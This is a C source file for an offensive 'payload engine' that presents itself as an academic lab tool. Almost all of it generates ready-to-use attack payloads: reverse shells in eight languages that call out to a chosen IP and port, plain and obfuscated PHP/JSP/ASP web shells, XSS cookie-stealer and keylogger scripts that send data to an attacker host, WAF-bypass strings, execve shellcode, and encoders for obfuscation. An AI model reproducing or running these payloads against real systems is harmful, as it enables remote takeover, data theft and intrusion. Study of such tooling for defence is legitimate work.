/*
 * payload_engine.c
 * BlackHunter Pro - Payload Engine
 * Generates encoded/obfuscated payloads for various attack vectors
 * Academic Penetration Testing Tool - Isolated Lab Only
 *
 * Compile: gcc -O2 -o payload_engine payload_engine.c
 * Usage:   ./payload_engine <type> <command> [options]
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <time.h>
#include <unistd.h>

/* ============================================= */
/* CONFIGURATION */
/* ============================================= */

#define MAX_PAYLOAD 8192
#define MAX_OUTPUT 16384

/* ============================================= */
/* GLOBAL VARIABLES */
/* ============================================= */

static char g_output[MAX_OUTPUT];

/* ============================================= */
/* BASE64 ENCODING */
/* ============================================= */

static const char b64_table[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static int base64_encode(const unsigned char *input, int input_len,
                         char *output, int output_size) {
    int i = 0, j = 0;
    unsigned char buf[3];
    unsigned char out[4];

    while (i < input_len) {
        int bytes = 0;

        /* Read up to 3 bytes */
        for (int k = 0; k < 3; k++) {
            if (i < input_len) {
                buf[k] = input[i++];
                bytes++;
            } else {
                buf[k] = 0;
            }
        }

        /* Encode */
        out[0] = b64_table[buf[0] >> 2];
        out[1] = b64_table[((buf[0] & 0x03) << 4) | (buf[1] >> 4)];
        out[2] = (bytes > 1) ? b64_table[((buf[1] & 0x0F) << 2) | (buf[2] >> 6)] : '=';
        out[3] = (bytes > 2) ? b64_table[buf[2] & 0x3F] : '=';

        /* Write to output */
        for (int k = 0; k < 4; k++) {
            if (j >= output_size - 1) return -1;
            output[j++] = out[k];
        }
    }

    output[j] = '\0';
    return j;
}

/* ============================================= */
/* HEX ENCODING */
/* ============================================= */

static int hex_encode(const char *input, char *output, int output_size, int prefix) {
    int j = 0;

    for (int i = 0; input[i] != '\0'; i++) {
        if (prefix) {
            if (j + 4 >= output_size) return -1;
            output[j++] = '\\';
            output[j++] = 'x';
            output[j++] = "0123456789abcdef"[(input[i] >> 4) & 0x0F];
            output[j++] = "0123456789abcdef"[input[i] & 0x0F];
        } else {
            if (j + 2 >= output_size) return -1;
            output[j++] = "0123456789abcdef"[(input[i] >> 4) & 0x0F];
            output[j++] = "0123456789abcdef"[input[i] & 0x0F];
        }
    }

    output[j] = '\0';
    return j;
}

/* ============================================= */
/* URL ENCODING */
/* ============================================= */

static int url_encode(const char *input, char *output, int output_size, int double_encode) {
    int j = 0;
    const char *hex = "0123456789ABCDEF";

    for (int i = 0; input[i] != '\0'; i++) {
        unsigned char c = (unsigned char)input[i];

        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            if (j >= output_size - 1) return -1;
            output[j++] = c;
        } else {
            if (double_encode) {
                /* Double encode: %25XX */
                if (j + 6 >= output_size) return -1;
                output[j++] = '%';
                output[j++] = '2';
                output[j++] = '5';
                output[j++] = hex[(c >> 4) & 0x0F];
                output[j++] = hex[c & 0x0F];
            } else {
                /* Single encode: %XX */
                if (j + 3 >= output_size) return -1;
                output[j++] = '%';
                output[j++] = hex[(c >> 4) & 0x0F];
                output[j++] = hex[c & 0x0F];
            }
        }
    }

    output[j] = '\0';
    return j;
}

/* ============================================= */
/* HTML ENTITY ENCODING */
/* ============================================= */

static int html_encode(const char *input, char *output, int output_size, int hex_format) {
    int j = 0;

    for (int i = 0; input[i] != '\0'; i++) {
        unsigned char c = (unsigned char)input[i];

        if (hex_format) {
            if (j + 8 >= output_size) return -1;
            j += snprintf(output + j, output_size - j, "&#x%02X;", c);
        } else {
            if (j + 7 >= output_size) return -1;
            j += snprintf(output + j, output_size - j, "&#%d;", c);
        }
    }

    output[j] = '\0';
    return j;
}

/* ============================================= */
/* UNICODE ESCAPE */
/* ============================================= */

static int unicode_encode(const char *input, char *output, int output_size) {
    int j = 0;

    for (int i = 0; input[i] != '\0'; i++) {
        if (j + 7 >= output_size) return -1;
        j += snprintf(output + j, output_size - j, "\\u%04x", (unsigned char)input[i]);
    }

    output[j] = '\0';
    return j;
}

/* ============================================= */
/* OCTAL ENCODING */
/* ============================================= */

static int octal_encode(const char *input, char *output, int output_size, int with_prefix) {
    int j = 0;

    for (int i = 0; input[i] != '\0'; i++) {
        if (with_prefix) {
            if (j + 5 >= output_size) return -1;
            j += snprintf(output + j, output_size - j, "\\%03o", (unsigned char)input[i]);
        } else {
            if (j + 4 >= output_size) return -1;
            j += snprintf(output + j, output_size - j, "%03o", (unsigned char)input[i]);
        }
    }

    output[j] = '\0';
    return j;
}

/* ============================================= */
/* ROT13 ENCODING */
/* ============================================= */

static int rot13_encode(const char *input, char *output, int output_size) {
    int i;

    for (i = 0; input[i] != '\0' && i < output_size - 1; i++) {
        char c = input[i];

        if (c >= 'a' && c <= 'z') {
            output[i] = ((c - 'a' + 13) % 26) + 'a';
        } else if (c >= 'A' && c <= 'Z') {
            output[i] = ((c - 'A' + 13) % 26) + 'A';
        } else {
            output[i] = c;
        }
    }

    output[i] = '\0';
    return i;
}

/* ============================================= */
/* REVERSE STRING */
/* ============================================= */

static int reverse_string(const char *input, char *output, int output_size) {
    int len = strlen(input);

    if (len >= output_size) return -1;

    for (int i = 0; i < len; i++) {
        output[i] = input[len - 1 - i];
    }

    output[len] = '\0';
    return len;
}

/* ============================================= */
/* XOR ENCODING */
/* ============================================= */

static int xor_encode(const char *input, const char *key, char *output, int output_size) {
    int key_len = strlen(key);
    int i;

    for (i = 0; input[i] != '\0' && i < output_size - 6; i++) {
        unsigned char c = input[i] ^ key[i % key_len];
        i += snprintf(output + i, output_size - i, "\\x%02x", c) - 1;
    }

    output[i] = '\0';
    return i;
}

/* ============================================= */
/* SHELL PAYLOAD GENERATORS */
/* ============================================= */

static void gen_reverse_shell_bash(const char *ip, const char *port) {
    printf("\n\033[1;36m[*] Bash Reverse Shell:\033[0m\n");
    printf("bash -i >& /dev/tcp/%s/%s 0>&1\n", ip, port);

    printf("\n\033[1;36m[*] Bash Reverse Shell (no /dev/tcp):\033[0m\n");
    printf("0<&196;exec 196<>/dev/tcp/%s/%s; sh <&196 >&196 2>&196\n", ip, port);
}

static void gen_reverse_shell_nc(const char *ip, const char *port) {
    printf("\n\033[1;36m[*] Netcat Reverse Shell:\033[0m\n");
    printf("nc -e /bin/sh %s %s\n", ip, port);

    printf("\n\033[1;36m[*] Netcat Reverse Shell (no -e):\033[0m\n");
    printf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f\n", ip, port);

    printf("\n\033[1;36m[*] Netcat Reverse Shell (Windows):\033[0m\n");
    printf("nc.exe -e cmd.exe %s %s\n", ip, port);
}

static void gen_reverse_shell_python(const char *ip, const char *port) {
    printf("\n\033[1;36m[*] Python Reverse Shell:\033[0m\n");
    printf("python -c 'import socket,subprocess,os;");
    printf("s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);");
    printf("s.connect((\"%s\",%s));", ip, port);
    printf("os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);");
    printf("subprocess.call([\"/bin/sh\",\"-i\"])'\n");

    printf("\n\033[1;36m[*] Python3 Reverse Shell:\033[0m\n");
    printf("python3 -c 'import socket,subprocess,os;");
    printf("s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);");
    printf("s.connect((\"%s\",%s));", ip, port);
    printf("os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);");
    printf("subprocess.call([\"/bin/sh\",\"-i\"])'\n");
}

static void gen_reverse_shell_perl(const char *ip, const char *port) {
    printf("\n\033[1;36m[*] Perl Reverse Shell:\033[0m\n");
    printf("perl -e 'use Socket;$i=\"%s\";$p=%s;", ip, port);
    printf("socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));");
    printf("if(connect(S,sockaddr_in($p,inet_aton($i)))){");
    printf("open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");");
    printf("exec(\"/bin/sh -i\");};'\n");
}

static void gen_reverse_shell_php(const char *ip, const char *port) {
    printf("\n\033[1;36m[*] PHP Reverse Shell:\033[0m\n");
    printf("php -r '$sock=fsockopen(\"%s\",%s);", ip, port);
    printf("exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n");
}

static void gen_reverse_shell_ruby(const char *ip, const char *port) {
    printf("\n\033[1;36m[*] Ruby Reverse Shell:\033[0m\n");
    printf("ruby -rsocket -e'f=TCPSocket.open(\"%s\",%s).to_i;", ip, port);
    printf("exec sprintf(\"/bin/sh -i <&%%d >&%%d 2>&%%d\",f,f,f)'\n");
}

static void gen_reverse_shell_powershell(const char *ip, const char *port) {
    printf("\n\033[1;36m[*] PowerShell Reverse Shell:\033[0m\n");
    printf("powershell -NoP -NonI -W Hidden -Exec Bypass -Command ");
    printf("\"$c=New-Object Net.Sockets.TCPClient('%s',%s);", ip, port);
    printf("$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};");
    printf("while(($i=$s.Read($b,0,$b.Length)) -ne 0){");
    printf("$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);");
    printf("$r=(iex $d 2>&1 | Out-String);");
    printf("$r2=$r+'PS '+(pwd).Path+'> ';");
    printf("$sb=([text.encoding]::ASCII).GetBytes($r2);");
    printf("$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\"\n");
}

static void gen_reverse_shell_socat(const char *ip, const char *port) {
    printf("\n\033[1;36m[*] Socat Reverse Shell:\033[0m\n");
    printf("socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%s\n", ip, port);
}

static void gen_reverse_shell_all(const char *ip, const char *port) {
    printf("\n\033[1;33m═══════════════════════════════════════════════════════\033[0m\n");
    printf("\033[1;33m  Reverse Shell Payloads for %s:%s\033[0m\n", ip, port);
    printf("\033[1;33m═══════════════════════════════════════════════════════\033[0m\n");

    gen_reverse_shell_bash(ip, port);
    gen_reverse_shell_nc(ip, port);
    gen_reverse_shell_python(ip, port);
    gen_reverse_shell_perl(ip, port);
    gen_reverse_shell_php(ip, port);
    gen_reverse_shell_ruby(ip, port);
    gen_reverse_shell_powershell(ip, port);
    gen_reverse_shell_socat(ip, port);

    printf("\n\033[1;32m[+] All payloads generated\033[0m\n");
}

/* ============================================= */
/* WEB SHELL GENERATORS */
/* ============================================= */

static void gen_web_shell_php(void) {
    printf("\n\033[1;36m[*] PHP Web Shell (Simple):\033[0m\n");
    printf("<?php system($_GET['c']); ?>\n");

    printf("\n\033[1;36m[*] PHP Web Shell (Full):\033[0m\n");
    printf("<?php if(isset($_REQUEST['cmd'])){echo '<pre>';system($_REQUEST['cmd']);echo '</pre>';} ?>\n");

    printf("\n\033[1;36m[*] PHP Web Shell (Obfuscated):\033[0m\n");
    printf("<?php $a='s'.'y'.'s'.'t'.'e'.'m';$a($_GET['c']); ?>\n");

    printf("\n\033[1;36m[*] PHP Web Shell (Base64):\033[0m\n");
    printf("<?php eval(base64_decode($_POST['c'])); ?>\n");

    printf("\n\033[1;36m[*] PHP Web Shell (Short):\033[0m\n");
    printf("<?=`$_GET[c]`?>\n");

    printf("\n\033[1;36m[*] PHP Web Shell (Bypass):\033[0m\n");
    printf("<?php $f=$_GET['f'];$f($_GET['c']); ?>\n");
}

static void gen_web_shell_jsp(void) {
    printf("\n\033[1;36m[*] JSP Web Shell:\033[0m\n");
    printf("<%% Runtime.getRuntime().exec(request.getParameter(\"c\")); %%>\n");

    printf("\n\033[1;36m[*] JSP Web Shell (Output):\033[0m\n");
    printf("<%%@ page import=\"java.util.*,java.io.*\"%%>\n");
    printf("<%%\n");
    printf("  Process p = Runtime.getRuntime().exec(request.getParameter(\"c\"));\n");
    printf("  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n");
    printf("  String line;\n");
    printf("  while((line = br.readLine()) != null){ out.println(line); }\n");
    printf("%%>\n");
}

static void gen_web_shell_asp(void) {
    printf("\n\033[1;36m[*] ASP Web Shell:\033[0m\n");
    printf("<%% eval request(\"c\") %%>\n");

    printf("\n\033[1;36m[*] ASPX Web Shell:\033[0m\n");
    printf("<%%@ Page Language=\"C#\" %%>\n");
    printf("<%% System.Diagnostics.Process.Start(\"cmd.exe\", \"/c \" + Request[\"c\"]); %%>\n");
}

static void gen_web_shell_all(void) {
    printf("\n\033[1;33m═══════════════════════════════════════════════════════\033[0m\n");
    printf("\033[1;33m  Web Shell Payloads\033[0m\n");
    printf("\033[1;33m═══════════════════════════════════════════════════════\033[0m\n");

    gen_web_shell_php();
    gen_web_shell_jsp();
    gen_web_shell_asp();

    printf("\n\033[1;32m[+] All web shells generated\033[0m\n");
}

/* ============================================= */
/* XSS PAYLOAD GENERATORS */
/* ============================================= */

static void gen_xss_payloads(void) {
    printf("\n\033[1;33m═══════════════════════════════════════════════════════\033[0m\n");
    printf("\033[1;33m  XSS Payloads\033[0m\n");
    printf("\033[1;33m═══════════════════════════════════════════════════════\033[0m\n");

    printf("\n\033[1;36m[*] Basic:\033[0m\n");
    printf("<script>alert(1)</script>\n");
    printf("<img src=x onerror=alert(1)>\n");
    printf("<svg onload=alert(1)>\n");

    printf("\n\033[1;36m[*] Cookie Stealer:\033[0m\n");
    printf("<script>new Image().src='http://ATTACKER/c?'+document.cookie</script>\n");

    printf("\n\033[1;36m[*] Keylogger:\033[0m\n");
    printf("<script>document.onkeypress=function(e){new Image().src='http://ATTACKER/k?'+e.key}</script>\n");

    printf("\n\033[1;36m[*] Defacement:\033[0m\n");
    printf("<script>document.body.innerHTML='<h1>HACKED</h1>'</script>\n");

    printf("\n\033[1;36m[*] WAF Bypass:\033[0m\n");
    printf("<ScRiPt>alert(1)</ScRiPt>\n");
    printf("<scr<script>ipt>alert(1)</scr</script>ipt>\n");
    printf("<img/src=x/onerror=alert(1)>\n");
    printf("%%3Cscript%%3Ealert(1)%%3C/script%%3E\n");

    printf("\n\033[1;36m[*] Polyglot:\033[0m\n");
    printf("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0D%%0A%%0d%%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n");

    printf("\n\033[1;32m[+] XSS payloads generated\033[0m\n");
}

/* ============================================= */
/* SHELLCODE GENERATORS (Linux x64) */
/* ============================================= */

static void gen_shellcode_execve(void) {
    printf("\n\033[1;33m═══════════════════════════════════════════════════════\033[0m\n");
    printf("\033[1;33m  Shellcode (Linux x64) - execve /bin/sh\033[0m\n");
    printf("\033[1;33m═══════════════════════════════════════════════════════\033[0m\n\n");

    printf("\033[1;36m[*] 27-byte execve(\"/bin/sh\"):\033[0m\n");
    printf("\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\n");

    printf("\n\033[1;36m[*] C array format:\033[0m\n");
    printf("unsigned char shellcode[] = {\n");
    printf("    0x48, 0x31, 0xf6, 0x56, 0x48, 0xbf, 0x2f, 0x62,\n");
    printf("    0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x54,\n");
    printf("    0x5f, 0x6a, 0x3b, 0x58, 0x99, 0x0f, 0x05\n");
    printf("};\n");

    printf("\n\033[1;32m[+] Shellcode generated\033[0m\n");
}

static void gen_shellcode_reverse(const char *ip, const char *port) {
    printf("\n\033[1;36m[*] Reverse Shell Shellcode (for %s:%s):\033[0m\n", ip, port);
    printf("\033[1;33m[!] Note: Shellcode must be compiled for target architecture\033[0m\n");
    printf("\033[1;33m[!] Use msfvenom for production shellcode:\033[0m\n\n");
    printf("msfvenom -p linux/x64/shell_reverse_tcp LHOST=%s LPORT=%s -f c\n", ip, port);
}

/* ============================================= */
/* ENCODE ALL */
/* ============================================= */

static void encode_all(const char *input) {
    char output[MAX_OUTPUT];
    int len;

    printf("\n\033[1;33m═══════════════════════════════════════════════════════\033[0m\n");
    printf("\033[1;33m  Encoded Variants of: %s\033[0m\n", input);
    printf("\033[1;33m═══════════════════════════════════════════════════════\033[0m\n\n");

    /* Base64 */
    len = base64_encode((unsigned char *)input, strlen(input), output, sizeof(output));
    if (len > 0) {
        printf("\033[1;36m[*] Base64:\033[0m\n%s\n\n", output);
    }

    /* Hex (with prefix) */
    len = hex_encode(input, output, sizeof(output), 1);
    if (len > 0) {
        printf("\033[1;36m[*] Hex:\\033[0m\n%s\n\n", output);
    }

    /* Hex (no prefix) */
    len = hex_encode(input, output, sizeof(output), 0);
    if (len > 0) {
        printf("\033[1;36m[*] Hex (raw):\033[0m\n%s\n\n", output);
    }

    /* URL encode */
    len = url_encode(input, output, sizeof(output), 0);
    if (len > 0) {
        printf("\033[1;36m[*] URL Encoded:\033[0m\n%s\n\n", output);
    }

    /* Double URL encode */
    len = url_encode(input, output, sizeof(output), 1);
    if (len > 0) {
        printf("\033[1;36m[*] Double URL Encoded:\033[0m\n%s\n\n", output);
    }

    /* HTML entity (decimal) */
    len = html_encode(input, output, sizeof(output), 0);
    if (len > 0) {
        printf("\033[1;36m[*] HTML Entities (decimal):\033[0m\n%s\n\n", output);
    }

    /* HTML entity (hex) */
    len = html_encode(input, output, sizeof(output), 1);
    if (len > 0) {
        printf("\033[1;36m[*] HTML Entities (hex):\033[0m\n%s\n\n", output);
    }

    /* Unicode */
    len = unicode_encode(input, output, sizeof(output));
    if (len > 0) {
        printf("\033[1;36m[*] Unicode:\033[0m\n%s\n\n", output);
    }

    /* Octal */
    len = octal_encode(input, output, sizeof(output), 1);
    if (len > 0) {
        printf("\033[1;36m[*] Octal:\033[0m\n%s\n\n", output);
    }

    /* ROT13 */
    len = rot13_encode(input, output, sizeof(output));
    if (len > 0) {
        printf("\033[1;36m[*] ROT13:\033[0m\n%s\n\n", output);
    }

    /* Reverse */
    len = reverse_string(input, output, sizeof(output));
    if (len > 0) {
        printf("\033[1;36m[*] Reversed:\033[0m\n%s\n\n", output);
    }

    /* XOR with key */
    len = xor_encode(input, "BLACKHUNTER", output, sizeof(output));
    if (len > 0) {
        printf("\033[1;36m[*] XOR (key='BLACKHUNTER'):\033[0m\n%s\n\n", output);
    }

    printf("\033[1;32m[+] All encodings generated\033[0m\n");
}

/* ============================================= */
/* DECODE FUNCTIONS */
/* ============================================= */

static int base64_decode_char(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static int base64_decode(const char *input, char *output, int output_size) {
    int len = strlen(input);
    int j = 0;
    int buf = 0;
    int bits = 0;

    for (int i = 0; i < len && j < output_size - 1; i++) {
        if (input[i] == '=') break;

        int val = base64_decode_char(input[i]);
        if (val < 0) continue;

        buf = (buf << 6) | val;
        bits += 6;

        if (bits >= 8) {
            bits -= 8;
            output[j++] = (buf >> bits) & 0xFF;
        }
    }

    output[j] = '\0';
    return j;
}

/* ============================================= */
/* RANDOM USER AGENT */
/* ============================================= */

static const char *USER_AGENTS[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0",
    NULL
};

static void print_random_user_agent(void) {
    int count = 0;
    while (USER_AGENTS[count] != NULL) count++;

    srand(time(NULL));
    int idx = rand() % count;

    printf("\033[1;36m[*] Random User-Agent:\033[0m\n");
    printf("%s\n", USER_AGENTS[idx]);
}

/* ============================================= */
/* PRINT USAGE */
/* ============================================= */

static void print_usage(const char *prog) {
    printf("BlackHunter Pro - Payload Engine\n");
    printf("Usage: %s <type> [args]\n\n", prog);
    printf("\033[1;36mTypes:\033[0m\n");
    printf("  encode <text>              - Encode text in multiple formats\n");
    printf("  decode-base64 <text>       - Decode base64 string\n");
    printf("  reverse-shell <ip> <port>  - Generate reverse shells\n");
    printf("  webshell                   - Generate web shells\n");
    printf("  xss                        - Generate XSS payloads\n");
    printf("  shellcode-execve           - Generate execve shellcode\n");
    printf("  user-agent                 - Random user agent\n");
    printf("  all <ip> <port>            - Generate all payloads\n");
    printf("\n");
    printf("\033[1;36mExamples:\033[0m\n");
    printf("  %s encode 'cat /etc/passwd'\n", prog);
    printf("  %s reverse-shell 192.168.1.100 4444\n", prog);
    printf("  %s webshell\n", prog);
    printf("  %s xss\n", prog);
    printf("\n");
}

/* ============================================= */
/* PRINT BANNER */
/* ============================================= */

static void print_banner(void) {
    printf("\n");
    printf("\033[1;35m");
    printf("  ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ \n");
    printf("  ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗\n");
    printf("  ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║\n");
    printf("  ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║\n");
    printf("  ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝\n");
    printf("  ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ \n");
    printf("\033[0m");
    printf("\033[1;36m");
    printf("                    Payload Engine v1.0\n");
    printf("              Academic Penetration Testing Tool\n");
    printf("\033[0m\n");
}

/* ============================================= */
/* MAIN */
/* ============================================= */

int main(int argc, char *argv[]) {
    print_banner();

    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }

    const char *type = argv[1];

    /* ENCODE */
    if (strcmp(type, "encode") == 0) {
        if (argc < 3) {
            fprintf(stderr, "\033[1;31m[!] Missing text to encode\033[0m\n");
            return 1;
        }

        char input[MAX_PAYLOAD];
        strncpy(input, argv[2], sizeof(input) - 1);
        input[sizeof(input) - 1] = '\0';

        /* Join remaining args */
        for (int i = 3; i < argc; i++) {
            strncat(input, " ", sizeof(input) - strlen(input) - 1);
            strncat(input, argv[i], sizeof(input) - strlen(input) - 1);
        }

        encode_all(input);
    }
    /* DECODE BASE64 */
    else if (strcmp(type, "decode-base64") == 0 || strcmp(type, "decode") == 0) {
        if (argc < 3) {
            fprintf(stderr, "\033[1;31m[!] Missing base64 string\033[0m\n");
            return 1;
        }

        char output[MAX_OUTPUT];
        base64_decode(argv[2], output, sizeof(output));
        printf("\033[1;36m[*] Decoded:\033[0m\n%s\n", output);
    }
    /* REVERSE SHELL */
    else if (strcmp(type, "reverse-shell") == 0 || strcmp(type, "shell") == 0) {
        if (argc < 4) {
            fprintf(stderr, "\033[1;31m[!] Usage: %s reverse-shell <ip> <port>\033[0m\n", argv[0]);
            return 1;
        }
        gen_reverse_shell_all(argv[2], argv[3]);
    }
    /* WEB SHELL */
    else if (strcmp(type, "webshell") == 0 || strcmp(type, "web-shell") == 0) {
        gen_web_shell_all();
    }
    /* XSS */
    else if (strcmp(type, "xss") == 0) {
        gen_xss_payloads();
    }
    /* SHELLCODE */
    else if (strcmp(type, "shellcode-execve") == 0 || strcmp(type, "shellcode") == 0) {
        gen_shellcode_execve();
    }
    else if (strcmp(type, "shellcode-reverse") == 0) {
        if (argc < 4) {
            fprintf(stderr, "\033[1;31m[!] Usage: %s shellcode-reverse <ip> <port>\033[0m\n", argv[0]);
            return 1;
        }
        gen_shellcode_reverse(argv[2], argv[3]);
    }
    /* USER AGENT */
    else if (strcmp(type, "user-agent") == 0 || strcmp(type, "ua") == 0) {
        print_random_user_agent();
    }
    /* ALL */
    else if (strcmp(type, "all") == 0) {
        if (argc < 4) {
            fprintf(stderr, "\033[1;31m[!] Usage: %s all <ip> <port>\033[0m\n", argv[0]);
            return 1;
        }
        gen_reverse_shell_all(argv[2], argv[3]);
        gen_web_shell_all();
        gen_xss_payloads();
        gen_shellcode_execve();
    }
    /* UNKNOWN */
    else {
        fprintf(stderr, "\033[1;31m[!] Unknown type: %s\033[0m\n", type);
        print_usage(argv[0]);
        return 1;
    }

    printf("\n\033[1;32m[+] Done!\033[0m\n\n");
    return 0;
}

/* ============================================= */
/* COMPILE INSTRUCTIONS */
/* ============================================= */

/*
 * Compile:
 *   gcc -O2 -o payload_engine payload_engine.c
 *   clang -O2 -o payload_engine payload_engine.c
 *
 * Usage:
 *   ./payload_engine encode "cat /etc/passwd"
 *   ./payload_engine reverse-shell 192.168.1.100 4444
 *   ./payload_engine webshell
 *   ./payload_engine xss
 *   ./payload_engine shellcode-execve
 *   ./payload_engine user-agent
 *   ./payload_engine all 192.168.1.100 4444
 */